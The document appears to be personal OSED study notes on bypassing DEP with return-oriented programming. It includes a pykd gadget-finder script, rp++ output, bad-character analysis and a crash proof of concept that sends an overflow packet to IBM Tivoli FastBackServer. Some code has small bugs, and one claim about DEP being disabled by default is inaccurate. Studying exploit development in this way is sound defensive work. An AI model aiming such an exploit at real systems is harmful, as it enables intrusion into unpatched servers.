# ROP Lore

## Why is ROP needed
The classic buffer overflows manage to execute arbitrary code by redirecting the execution flow to **something in the stack (that is normally also user-controlled)**.
However, the normal program flow does **not need to redirect the execution flow of the stack as the code that is being executed is normally** in the .text section of the binary. The stack is used to store and manage local variables and parameters to functions.
## Distinction between code/data regions
So in order to avoid the classic buffer overflow, the operating system marks the pages of memory of the stack as non-executable, modifying the NX bit of the CPU. The kernel sets the NX bit when the OS maps a memory page.
If an application attempts to execute code from a data page that is protected (NX bit), a memory access violation exception occurs, and if the exception is not handled, the calling process is terminated.
**Note: normally, DEP and NX is disabled at OS level but some BIOS allows disabling the bit directly in the BIOS config**. This is so that the CPU does not enforce this security mechanism. 
## Ret2libc in Linux
Originally, to bypass DEP a jump to the libc function was performed, passing the arguments. You set the arguments in the stack, and call the function you want to execute of the libc, which is executable code.

Over the years, the technique was expanded, and the commonly-used Return Oriented Programming (ROP) method was developed, allowing the user to execute any code routine and not only specific library functions.

## Old DEP bypass by using ROP (Windows)
Exploit developers first abused the fact that DEP **could** be disabled on a per-process basis in Windows.
Even if DEP was enabled as a "AlwaysOn" system policy, it could be disabled per process once the process is running.
The idea was to invoke the `NtSetInformationProcess` API, which resides in a memory region that is already executable. With this, an attacker could disable DEP before executing their shellcode. Therefore, mark the stack as executable again and execute our shellcode in the stack. This works by replacing the commonly-used "jump to shellcode" for the memory address of NtSetInformationProcess. Additionally, we also have to place the required arguments on the stack as part of the overwrite.
Once the NtSetInformationProcess API finishes, DEP is disabled, and we can jump to our shellcode again. Other attack variations have been widely used in public exploits. One such attack uses the WinExec function to execute commands on the vulnerable system. While this is useful, it is not as effective as having arbitrary shellcode execution.

Now, Windows implements the **Permanent DEP:** any executable linked with the `/NXCOMPAT` flag is automatically set as `OptIn`, meaning that it DEP cannot be disabled.
The only option then is to **circumvent the operating system NX checks.**

# ROP technical considerations
Instead of setting in our stacks the "libc" or whatever function we want to execute in a memory page with execution, a more general approach was designed.
We can design a technique to call **any instruction sequence we want, if these conditions are met:**
- The instruction(s) we want to execute are followed by a ret at the end
- The instruction we want is in a memory page with execution rights.
If that condition happens, the instruction is a ROP gadget.

We will replace RIP **with the memory address of any "gadget"**, so we jump to that instruction, execute it, and then return to the next instruction to execute (which will be the next element in the stack).
For that, we need to have the necessary gadgets in the application to perform our task.
The number of obtainable gadgets depends on the OS version and the vulnerable application.

## Different ROP approaches
At this point, depending on our goals and on the number of gadgets we can obtain, there are two different approaches we could take: 
1. Build a 100% ROP shellcode. 
2. Build a ROP stage that can lead to subsequent execution of traditional shellcode.

The first approach is rather complicated to implement, so we’ll pursue the second instead. A goal of the ROP stage could be to allocate a chunk of memory with write and execute permissions and then copy shellcode to it.

One way to implement this ROP attack is to allocate memory using the Win32 VirtualAlloc API. A different approach to bypass DEP could be to change the permissions of the memory page where the shellcode already resides by calling the Win32 VirtualProtect API. The address of both functions is usually retrieved from the Import Address Table (IAT) of the target DLL that contains them. Then the required parameters need to be pushed in the stack, which can also be done using ROP gadgets and are usually done dinamically using ROP gadgets as you can't hardcode the parameters (e.g., you might n)

Another alternative is to use the WriteProcessMemory to hot-patch any code section (normally the .text section) with shellcode and jump into it. Sometimes a call to NtProtectVirtualMemory or similar might be done in order to turn the memory page to writable (as code sections are normally RX but not WRX or WX).

However, in both approaches, we are jumping to a executable sections instead of modifying the "NX" flag of the memory pages of the stack.

## Gadget selection
So far, we have a good understanding of the theory behind DEP and how to overcome it with ROP. A key missing element is how to locate the gadgets that are needed to invoke the APIs. 

In the classic buffer overflow, we use the WinDbg search command to obtain the address of an instruction like JMP ESP. For ROP though, we need to locate the addresses of all the possible gadgets we can obtain. This first step will allow us to choose the gadgets we need and combine them to bypass DEP. 

However, it’s difficult to search for gadgets manually because of the large number of possible candidates. Instead, we’ll need to automate the process. We will discuss two different methods.

**Note: Typically, it is not beneficial to search for very long ROP gadgets because they will eventually contain instructions that are not useful, such as calls and jumps.** The OSED course shows that more than 5 instructions could start to be a serious problem. We filter by 5 and then filter the resulting gadgets.

Note that:
- jmp and call gadgets alter the execution flow, which might break our chain.
- push, pop gadgets change the stack, we have to be careful with that.
- mov esp, or any esp operation, alter the stack pointer, we have to be careful with that.
- Assembly language contains several privileged instructions, which a regular application cannot execute. We must design our algorithm to remove these also.

```
Bad instructions for gadgets: Privileged + unknown opcode "???" + jumps/calls
BAD = ["clts", "hlt", "lmsw", "ltr", "lgdt", "lidt" ,"lldt", "mov cr", "mov dr", "mov tr", "in ", "ins", "invlpg", "invd", "out", "outs", "cli", "sti" "popf", "pushf", "int", "iret", "iretd", "swapgs", "wbinvd", "call", "jmp", "leave", "ja", "jb", "jc", "je", "jr", "jg", "jl", "jn", "jo", "jp", "js", "jz", "lock", "enter", "wait", "???"]
```

**Note**: In some advanced cases, we might want to make use of a gadget containing a conditional jump instruction or a call. If we craft the stack layout appropriately, we can make use of these gadgets without disrupting the execution flow, but typically, it is best to avoid them altogether unless strictly required by specific conditions.


**Note**: In x64, each memory page is 0x1000 (4kb). Each module will have several memory pages, so we want to analyze all of them in search of our gadgets. Some of them will be executable, some of them will not be.

### Pykd for gadget selection
Python-based WinDbg extension, that can be used also as individual scripts.

The pykd script must locate gadgets inside code pages of an EXE or DLL with the execute permission set.

The first step is to accept the name of the module as a parameter and locate it in memory. Then, for the selected module, we locate all memory pages that are executable. 
Code that is executed on these pages will not result in DEP throwing an access violation.
For each of these memory pages, we are going to locate the memory address of all the RET assembly instructions and store them in a list.
Once we have this list of memory addresses, we pick the first one, subtract one byte from it, and disassemble the opcodes to check if they are valid assembly instructions. If they are, we have found a possible ROP gadget. This process will continue, by subtracting another byte and rechecking. 

This is the pykd that will perform our gadget search functionality:
```python

from pykd import *
import sys, time

HEADER =  "#"*80 + "\r\n"
HEADER += "# findrop.py - pykd module for Gadget Discovery\r\n"
HEADER += "#"*80 + "\r\n\r\n"
  
##MEM_ACCESS = {
##0x1   : "PAGE_NOACCESS"                                                    ,
##0x2   : "PAGE_READONLY"                                                    ,
##0x4   : "PAGE_READWRITE"                                                   ,
##0x8   : "PAGE_WRITECOPY"                                                   ,
##0x10  : "PAGE_EXECUTE"                                                     ,
##0x20  : "PAGE_EXECUTE_READ"                                                ,
##0x40  : "PAGE_EXECUTE_READWRITE"                                           ,
##0x80  : "PAGE_EXECUTE_WRITECOPY"                                           ,
##0x101 : "PAGE_NOACCESS PAGE_GUARD"                                         ,
##0x102 : "PAGE_READONLY PAGE_GUARD "                                        ,
##0x104 : "PAGE_READWRITE PAGE_GUARD"                                        ,
##0x108 : "PAGE_WRITECOPY PAGE_GUARD"                                        ,
##0x110 : "PAGE_EXECUTE PAGE_GUARD"                                          ,
##0x120 : "PAGE_EXECUTE_READ PAGE_GUARD"                                     ,
##0x140 : "PAGE_EXECUTE_READWRITE PAGE_GUARD"                                ,
##0x180 : "PAGE_EXECUTE_WRITECOPY PAGE_GUARD"                                ,
##0x301 : "PAGE_NOACCESS PAGE_GUARD PAGE_NOCACHE"                            ,
##0x302 : "PAGE_READONLY PAGE_GUARD PAGE_NOCACHE"                            ,
##0x304 : "PAGE_READWRITE PAGE_GUARD PAGE_NOCACHE"                           ,
##0x308 : "PAGE_WRITECOPY PAGE_GUARD PAGE_NOCACHE"                           ,
##0x310 : "PAGE_EXECUTE PAGE_GUARD PAGE_NOCACHE"                             ,
##0x320 : "PAGE_EXECUTE_READ PAGE_GUARD PAGE_NOCACHE"                        ,
##0x340 : "PAGE_EXECUTE_READWRITE PAGE_GUARD PAGE_NOCACHE"                   ,
##0x380 : "PAGE_EXECUTE_WRITECOPY PAGE_GUARD PAGE_NOCACHE"                   ,
##0x701 : "PAGE_NOACCESS PAGE_GUARD PAGE_NOCACHE PAGE_WRITECOMBINE"          ,
##0x702 : "PAGE_READONLY PAGE_GUARD PAGE_NOCACHE PAGE_WRITECOMBINE"          ,
##0x704 : "PAGE_READWRITE PAGE_GUARD PAGE_NOCACHE PAGE_WRITECOMBINE"         ,
##0x708 : "PAGE_WRITECOPY PAGE_GUARD PAGE_NOCACHE PAGE_WRITECOMBINE"         ,
##0x710 : "PAGE_EXECUTE PAGE_GUARD PAGE_NOCACHE PAGE_WRITECOMBINE"           ,
##0x720 : "PAGE_EXECUTE_READ PAGE_GUARD PAGE_NOCACHE PAGE_WRITECOMBINE"      ,
##0x740 : "PAGE_EXECUTE_READWRITE PAGE_GUARD PAGE_NOCACHE PAGE_WRITECOMBINE" ,
##0x780 : "PAGE_EXECUTE_WRITECOPY PAGE_GUARD PAGE_NOCACHE PAGE_WRITECOMBINE" ,
##}

MEM_ACCESS_EXE = {
0x10  : "PAGE_EXECUTE"                                                     ,
0x20  : "PAGE_EXECUTE_READ"                                                ,
0x40  : "PAGE_EXECUTE_READWRITE"                                           ,
0x80  : "PAGE_EXECUTE_WRITECOPY"                                           ,
}

PAGE_SIZE = 0x1000
MAX_GADGET_SIZE = 8

BAD = ["clts", "hlt", "lmsw", "ltr", "lgdt", "lidt" ,"lldt", "mov cr", "mov dr",
    "mov tr", "in ", "ins", "invlpg", "invd", "out", "outs", "cli", "sti"
    "popf", "pushf", "int", "iret", "iretd", "swapgs", "wbinvd", "call",
    "jmp", "leave", "ja", "jb", "jc", "je", "jr", "jg", "jl", "jn", "jo",
    "jp", "js", "jz", "lock", "enter", "wait", "???"]

def log(msg):
 """
 Log a message to console.
 @param msg: Message string
 @return: None
 """
 print("[+] " + msg)

  

def getModule(modname):
 """
 Return a module object.
 @param modname: string module name
 @return: pykd module object
 """
 return module(modname)

  

def isPageExec(address):
 """
 Return True if a mem page is marked as executable
 @param address: address in hex format 0x41414141.
 @return: Bool

 """
 try:
     protect = getVaProtect(address)
 except:
     protect = 0x1
 if protect in MEM_ACCESS_EXE.keys():
     return True
 else:
     return False

def findExecPages(mod):
 """
 Find Executable Memory Pages for a module.
 @param mod: module object returned by getModule
 @return: a python list of executable memory pages
 """
 pages = []
 pn = int((mod.end() - mod.begin()) / PAGE_SIZE)
 log("Total Memory Pages: %d" % pn)
 for i in range(0, pn):
     page = mod.begin() + i*PAGE_SIZE
     if isPageExec(page):
         pages.append(page)
 log("Executable Memory Pages: %d" % len(pages))
 return pages

  

def findRetn(pages):
 """
 Find all return instructions for the given memory pages.
 @param pages: list of memory pages
 @return: list of memory addresses
 """
 retn = []
 for page in pages:
     ptr = page
     while ptr < (page + PAGE_SIZE):
         b = loadSignBytes(ptr, 1)[0] & 0xff
         if b not in [0xc3, 0xc2]:
             ptr += 1
             continue
         else:
             retn.append(ptr)
             ptr += 1
 log("Found %d ret instructions" % len(retn))
 return retn

def formatInstr(instr, mod):
 """
 Replace address with modbase+offset.
 @param instr: instruction string from disasm.instruction()
 @param mod: module object from getModule
 @return: formatted instruction string: modbase+offset instruction
 """
 address = int(instr[0:8], 0x10)
 offset = address - mod.begin()
 return "%s+0x%x\t%s" % (mod.name(), offset, instr[9:])

  

def disasmGadget(addr, mod, fp)
 """
 Find gadgets. Start from a ret instruction and crawl back from 1 to
 MAX_GADGET_SIZE bytes. At each iteration disassemble instructions and
 make sure the result gadget has no invalid instruction and is still
 ending with a ret.
 @param addr: address of a ret instruction
 @param mod: module object from getModule
 @param fp: file object to log found gadgets
 @return: number of gadgets found starting from a specific address
 """

 count = 0

 for i in range(1, MAX_GADGET_SIZE):
     gadget = []
     ptr = addr - i
     dasm = disasm(ptr)
     gadget_size = dasm.length()
     while gadget_size <= MAX_GADGET_SIZE:
         instr = dasm.instruction()
         if any(bad in instr for bad in BAD):
             break

         gadget.append(instr)
         if instr.find("ret") != -1:
             break
         dasm.disasm()
         gadget_size += dasm.length()
     matching = [i for i in gadget if "ret" in i]

     if matching:
         count += 1
         fp.write("-"*86 + "\r\n")

         for instr in gadget:
            try:
                fp.write(str(instr) + "\r\n")

            except UnicodeEncodeError:
                print(str(repr(instr)))

 return count

if __name__ == '__main__':
 print("#"*63)
 print("# findrop.py pykd Gadget Discovery module #")
 print("#"*63)

 count = 0

 try:
     modname = sys.argv[1].strip()

 except IndexError:
     log("Syntax: findrop.py modulename [MAX_GADGET_SIZE]")
     log("Example: findrop.py ntdll 8")
     sys.exit()
 try:
     MAX_GADGET_SIZE = int(sys.argv[2])

 except IndexError:
     pass

 except ValueError:
     log("Syntax: findrop.py modulename [MAX_GADGET_SIZE]")
     log("Example: findrop.py ntdll 8")
     log("MAX_GADGET_SIZE needs to be an integer")
     sys,exit()

 mod = getModule(modname)

 if mod:
     pages = findExecPages(mod)
     retn  = findRetn(pages)
     if retn:
         fp = open("C:/tools/pykd/findrop_output.txt", "w")
         fp.write(HEADER)
         start = time.time()
         log("Gadget discovery started...")
         for ret in retn:
             count += disasmGadget(ret, mod, fp)                        
         fp.close()
         end = time.time()
         log("Gadget discovery ended (%d secs)." % int(end-start))
         log("Found %d gadgets in %s." % (count, mod.name()))
     else:
         log("ret instructions not found!")
```

The maximum number of bytes to subtract depends on the length of ROP gadgets we want. 

Example of using the tool in WinDb, with a default of 8 bytes length. First we load it, and then we use the custom script we created to find ROP gadgets:
```c
0:077>  .load pykd
0:077> !py C:\Tools\pykd\findropfull.py
###############################################################
# findrop.py pykd Gadget Discovery module #
###############################################################
[+] Syntax: findrop.py modulename [MAX_GADGET_SIZE]
[+] Example: findrop.py ntdll 8
0:077> !py C:\Tools\pykd\findropfull.py FastBackServer
###############################################################
# findrop.py pykd Gadget Discovery module #
###############################################################
[+] Total Memory Pages: 2060
[+] Executable Memory Pages: 637
[+] Found 13155 ret instructions
[+] Gadget discovery started...
'004bb6fb e105            loope   FastBackServer!std::pair<std::basic_string<unsigned short,std::char_traits<unsigned short>,std::allocator<unsigned short> > const ,char>::~pair<std::basic_string<unsigned short,std::char_traits<unsigned short>,std::allocat\x00쓐۽쑙Ơ쓐۽쓤۽䡻厨\uffff\uffff쓰۽\udc81北\ue5b0ࡦ\udc81北쑡Ơ⻐\u07fc츨߯씔۽䡋厨\x00\x00씠۽힗匋뛻K\x00\x00얱Ơ玈ӏ㔰Ӛ츨߯'
'004bbf4b e110            loope   FastBackServer!std::map<std::basic_string<unsigned short,std::char_traits<unsigned short>,std::allocator<unsigned short> >,char,std::less<std::basic_string<unsigned short,std::char_traits<unsigned short>,std::allocator<uns\x00쓐۽쑙Ơ쓐۽쓤۽䡻厨\uffff\uffff쓰۽\udc81北\ue5b0ࡦ\udc81北쑡Ơ⻐\u07fc츨߯씔۽䡋厨\x00\x00씠۽힗匋뽋K\x00\x00얱Ơ玈ӏ㝠Ӛ츨߯⻐\u07fc앤۽攧厧\x01\x00앰۽氬匎뽋'
'00630c8b e100            loope   FastBackServer!std::map<ChainStatsKey_t,ChainStatisticsDef,std::less<ChainStatsKey_t>,std::allocator<ChainStatisticsDef> >::~map<ChainStatsKey_t,ChainStatisticsDef,std::less<ChainStatsKey_t>,std::allocator<ChainStatisticsD\x00쓐۽쑙Ơ쓐۽쓤۽䡻厨\uffff\uffff쓰۽\udc81北\ue5b0ࡦ\udc81'
[+] Gadget discovery ended (10 secs).
[+] Found 30368 gadgets in FastBackServer.
```

The TXT file with the ROP gadgets can be queried (and grepped) to find for the ROP gadgets we want.

# Our first ROP exploit
Let's use the FastBackServer exploit proof of concept:
```python
import socket  
import sys  
from struct import pack  
# psAgentCommand  
buf = bytearray([0x41]*0xC)  
buf += pack("<i", 0x534) # opcode  
buf += pack("<i", 0x0) # 1st memcpy: offset  
buf += pack("<i", 0x500) # 1st memcpy: size field  
buf += pack("<i", 0x0) # 2nd memcpy: offset  
buf += pack("<i", 0x100) # 2nd memcpy: size field  
buf += pack("<i", 0x0) # 3rd memcpy: offset  
buf += pack("<i", 0x100) # 3rd memcpy: size field  
buf += bytearray([0x41]*0x8)  
# psCommandBuffer  
formatString = b"File: %s From: %d To: %d ChunkLoc: %d FileLoc: %d" %  
(b"A"*0x200,0,0,0,0)  
buf += formatString  
# Checksum  
buf = pack(">i", len(buf)-4) + buf  
  
def main():  
    server =  "192.168.122.113" 
    port = 11460  
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  
    s.connect((server, port))  
    s.send(buf)  
    s.close()  
    print("[+] Packet sent")  
    sys.exit(0)  
  
  
if __name__ == "__main__":  
    main()
```

Let's find the specific offset to crash the buffer:
```bash                              
msf-pattern_offset -l 512 -q 41326a41 
[*] Exact match at offset 276
```
At 276 bytes we start overriding EIP.

If we dump the value that ESP has (stack pointer) we find that it is at offset 280.
**This means that ESP points right after the return address**. It is good because we added a offset to override the EIP, and, the following bytes will be pointed by ESP.

### RP++ for ROP gadget search
This tool will increase our speed compared to the PYKD tool.
The rp++ tool is a series of open source C++ applications written in C+ and provide support for both 32-bit and 64-bit CPUs.
The various compiled executables can run on Windows, Linux, MacOS and can locate gadgets in PE Files, ELF files and Mach-O files.

Besides supporting a wide array of operating systems, rp++ does not run inside the debugger, but rather works directly on the file system. This provides a massive speed increase and is one of the reasons we prefer it.

We just use the executable targeting the application and a output file to store the results of the search (always **filtering by a gadget length**):
```c
C:\Users\user\Desktop\rp-win>rp-win-x86.exe -f FastBackServer.exe -r 5 > rop.txt
```

This is an output example of the tool:
```c
Trying to open 'FastBackServer.exe'..
Loading PE information..
FileFormat: PE, Arch: Ia32
Using the Nasm syntax..

Wait a few seconds, rp++ is looking for gadgets..
in .text
211283 found.

A total of 211283 gadgets found.
0x00547b94: aaa  ; adc dword [eax], eax ; add esp, 0x08 ; mov ecx, dword [ebp-0x00000328] ; mov dword [ecx+0x00000208], 0x00000C04 ; call dword [0x0067E494] ;  (1 found)
0x00569725: aaa  ; add byte [eax], al ; add byte [ebx+0x0BC0E8C8], cl ; or eax, 0x5DE58B00 ; ret  ;  (1 found)
0x005417b2: aaa  ; add byte [eax], al ; call dword [0x0067E494] ;  (1 found)
0x00541b78: aaa  ; add byte [eax], al ; call dword [0x0067E494] ;  (1 found)
```
We can see that for example the first found gadget is 5 instructions length.

If we for example want to find only "pop eax, ret" simple gadgets, we can do it as each gadget sequence starts with ":". Searching for ": pop eax ; ret" gives us this result:
```
0x004f22f2: pop eax ; ret  ;  (1 found)
0x004f2436: pop eax ; ret  ;  (1 found)
0x0052f30c: pop eax ; ret  ;  (1 found)
0x0061fdc4: pop eax ; ret  ;  (1 found)
0x0066f936: pop eax ; ret  ;  (1 found)
0x0066f98c: pop eax ; ret  ;  (1 found)
0x0066fff0: pop eax ; ret  ;  (1 found)
0x006701af: pop eax ; ret  ;  (1 found)
0x00670628: pop eax ; ret  ;  (1 found)
0x006705e0: pop eax ; ret  ;  (1 found)
0x0067180c: pop eax ; ret  ;  (1 found)
0x006723f6: pop eax ; ret  ;  (1 found)
0x00673430: pop eax ; ret  ;  (1 found)
0x006734ad: pop eax ; ret  ;  (1 found)
0x006744ba: pop eax ; ret  ;  (1 found)
0x0067456e: pop eax ; ret  ;  (1 found)
0x00676646: pop eax ; ret  ;  (1 found)
0x00676b17: pop eax ; ret  ;  (1 found)
0x006770dd: pop eax ; ret  ;  (1 found)
0x0067713a: pop eax ; ret  ;  (1 found)
0x006779af: pop eax ; ret  ;  (1 found)
0x006779c4: pop eax ; ret  ;  (1 found)
0x00677bca: pop eax ; ret  ;  (1 found)
0x00677e82: pop eax ; ret  ;  (1 found)
0x006783e9: pop eax ; ret  ;  (1 found)
```

Several memory locations where the same gadget resides, good for badchars and that stuff.

**Note: when searching for badchars, if one char does not seem to be a badchar but the previous one, and when deleting the previous one, the other previous one is badchar also, and this is repeated, it is possible that the badchar is the char that does not seem to be it. I deleted 4 chars in a row thinking that they were badchars, but the actual badchar was after them.**
**Note: common badchars are 00, 09 (HT),, 0b (VT), 0a (LF), 0c (FF), 0d (CR), 0x20 (space)**
The badchars for this program are: 
```
0x00, 0x09, 0x0A, 0x0B, 0x0C, 0x0D, 0x20
```

Now, we have to locate gadgets to perform what we want. The problem is that the **FastBackServer** module is located at this address:
```
0:061> lm m FastBackServer
Browse full module list
start    end        module name
00400000 00c0c000   FastBackServer   (deferred)    
```

So bad as the gadgets from this module will always start at 00. As our payloads will be gadgets, which are memory address inside modules, we can't use this module for the gadgets. We need to find a different module that does not contain a null byte in the uppermost byte and one that is preferably part of the application. If we choose a module that is not part of the application, then the address of gadgets will vary depending on the patch level of the operating system.

**Note: Native Windows modules often have additional protections enabled, which will require an even more advanced approach,** therefore, it is recommended to always try to find modules that are native from the application.

Doing "lm m" list us all the modules. We can go 1 by 1 and see which one is native from the application, and choose one.
For example, this one:
```c
0:061> lmDvmCSFTPAV6
Browse full module list
start    end        module name
50500000 50577000   CSFTPAV6   (deferred)             
    Image path: C:\Program Files\Tivoli\TSM\FastBack\server\CSFTPAV6.DLL
    Image name: CSFTPAV6.DLL
    Browse all global symbols  functions  data
    Timestamp:        Tue Jun  1 20:36:01 2010 (4C056121)
    CheckSum:         00078277
    ImageSize:        00077000
    File version:     6.0.6030.1648
    Product version:  6.0.6030.1648
    File flags:       0 (Mask 0)
    File OS:          4 Unknown Win32
    File type:        2.0 Dll
    File date:        00000000.00000000
    Translations:     0409.04e4
    Information from resource tables:
        CompanyName:      Catalyst Development Corporation
        ProductName:      SocketTools (Win32)
        InternalName:     CSFTPAV6
        OriginalFilename: CSFTPAV6.DLL
        ProductVersion:   6.0.6030.1648
        FileVersion:      6.0.6030.1648
        FileDescription:  SocketTools File Transfer Protocol Library
        LegalCopyright:   Copyright 2010 Catalyst Development Corporation
        LegalTrademarks:  SocketTools is a trademark of Catalyst Development Corporation
        Comments:         This library may only be redistributed according to the terms of the developer license
```

Let's use the rp++ tool to locate gadgets inside this DLL:
```
rp-win-x86.exe -f csftpav6.dll -r 5 > rop.txt
```

We can see that the gadgets start by 0x50, not 0x00, so we "bypassed" the badchar restriction by choosing other module for our ROP gadgets:
```c
Trying to open 'C:\Program Files\Tivoli\TSM\FastBack\server\csftpav6.dll'..
Loading PE information..
FileFormat: PE, Arch: Ia32
Using the Nasm syntax..

Wait a few seconds, rp++ is looking for gadgets..
in .text
28498 found.

A total of 28498 gadgets found.
0x505062c0: aaa  ; add byte [eax], al ; call dword [0x5054A188] ;  (1 found)
0x505072fa: aaa  ; add byte [eax], al ; call dword [0x5055CA10] ;  (1 found)
0x5050733a: aaa  ; add byte [eax], al ; call dword [0x5055CA10] ;  (1 found)
0x5050735c: aaa  ; add byte [eax], al ; call dword [0x5055CA14] ;  (1 found)
0x5050ae9f: aaa  ; add byte [eax], al ; inc eax ; pop esi ; pop edi ; retn 0x0004 ;  (1 found)
0x50507169: aaa  ; add byte [eax], al ; push ebx ; call dword [0x5054A098] ;  (1 found)
0x505212fe: aaa  ; add byte [ecx+0x3707D6C6], al ; ret  ;  (1 found)
0x5051ec12: aaa  ; add dword [eax], eax ; add esp, 0x0C ; pop ebp ; ret  ;  
```
**Note: we can choose and mix different modules in case one module doesn't have the gadget we want.**
## End notes

**Note 1: In Windows, the PE file can have DEP disabled but you can enable DEP for the binary by using Windows Defender Exploit Guard in Windows Defender Security Center**. Here is an example, which Narly doesn't detect DEP in the FastBackServer module as it reads the PE header, but DEP in the module is enforced by the OS:

**Note2: In x64, opcodes differ in length, therefore the search of gadgets is dynamic and not deterministic. In other architectures with fixed opcode length (ARM > 4 BYTES LENGTH), we just search for fixed offsets.**

**Note 3: A way to check the protections of each memory page**:
```c
0:077> .load narly
0:077> !nmod
001b0000 001e3000 snclientapi          /SafeSEH OFF                C:\Program Files\Tivoli\TSM\FastBack\server\snclientapi.dll
00400000 00c0c000 FastBackServer       /SafeSEH OFF                C:\Program Files\Tivoli\TSM\FastBack\server\FastBackServer.exe


// We can see that the exception is enforced when EIP points to the stack and executes code. DEP is enabled for this module.
0:077>  ed esp 90909090
0:077> r eip = esp
0:077> !vprot eip
BaseAddress:       010ef000
AllocationBase:    00ff0000
AllocationProtect: 00000004  PAGE_READWRITE
RegionSize:        00001000
State:             00001000  MEM_COMMIT
Protect:           00000004  PAGE_READWRITE
Type:              00020000  MEM_PRIVATE
0:077> p
(158c.1110): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=00236000 ebx=00000000 ecx=77d9b350 edx=77d9b350 esi=77d9b350 edi=77d9b350
eip=010eff44 esp=010eff44 ebp=010eff70 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246
010eff44 90              nop
```

